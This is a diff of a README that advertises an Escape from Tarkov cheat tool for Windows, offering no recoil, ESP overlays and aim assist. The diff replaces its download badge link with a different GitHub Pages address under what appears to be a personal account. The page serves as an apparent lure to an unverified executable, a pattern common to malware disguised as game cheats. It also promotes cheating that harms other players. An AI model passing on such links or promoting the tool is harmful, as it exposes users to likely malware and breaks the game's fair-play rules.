@@ -3,7 +3,7 @@
 Take full control of your raids in **Escape from Tarkov** with the all-in-one **Prime Menu Tool** for Windows. Access multiple tactical modules in a single interface: no recoil, ESP overlays, aim assist, and raid optimizers.
 
 ⬇️ **Download**  
-[![Download EFT Prime Menu](https://img.shields.io/badge/Download-EFT_Prime_Menu-000000?style=for-the-badge&logo=escape-from-tarkov&logoColor=white)](https://eft-prime-menu-tool.github.io/.github/)
+[![Download EFT Prime Menu](https://img.shields.io/badge/Download-EFT_Prime_Menu-000000?style=for-the-badge&logo=escape-from-tarkov&logoColor=white)](https://mariawilkie72.github.io/.github/eft-prime-menu-tool)
 
 ---
 
